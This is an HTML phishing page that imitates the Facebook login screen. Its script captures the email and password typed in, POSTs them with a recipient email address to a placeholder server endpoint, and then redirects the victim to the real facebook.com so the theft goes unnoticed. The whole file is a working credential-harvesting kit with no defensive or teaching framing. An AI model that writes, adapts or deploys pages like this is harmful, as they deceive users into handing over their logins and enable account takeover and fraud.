<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 80%;
            max-width: 1000px;
        }
        .logo {
            flex: 1;
            margin-right: 50px;
        }
        .logo h1 {
            color: #1877f2;
            font-size: 56px;
            margin: 0;
            font-weight: bold;
        }
        .logo p {
            font-size: 24px;
            color: #606770;
            margin: 10px 0 30px;
            line-height: 1.5;
        }
        .login-form {
            align-items: center;
            background-color: #594f4f;
            border: none;
            border-radius: 8px;
            box-shadow: 0px 2px 4px rgba(0, 0, 0, .1), 0px 8px 16px rgba(0, 0, 0, .1);
            box-sizing: border-box;
            margin: 40px 0 0;
            padding: 20px 0 28px;
            width: 396px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-form input {
            width: 90%;
            padding: 14px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        .login-form button {
            width: 90%;
            padding: 14px;
            margin: 10px 0;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
        }
        .login-form a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin: 10px 0;
        }
        .create-account {
            background-color: #42b72a;
            margin-top: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="login-form">
            <input type="text" id="email" placeholder="Email or phone number">
            <input type="password" id="password" placeholder="Password">
            <button onclick="sendLoginInfo()">Log In</button>
            <a href="#">Forgot password?</a>
            <button class="create-account">Create new account</button>
        </div>
    </div>
    <script>
        function sendLoginInfo() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // For demonstration, log the credentials to the console
            console.log(`Email: ${email}, Password: ${password}`);

            // Here you would send the data to your server
            fetch('https://your-server-endpoint.com/send-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    email: email, 
                    password: password, 
                    recipient: 'todovo5509@cantozil.com' 
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                // Redirect to Facebook
                window.location.href = 'https://www.facebook.com';
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
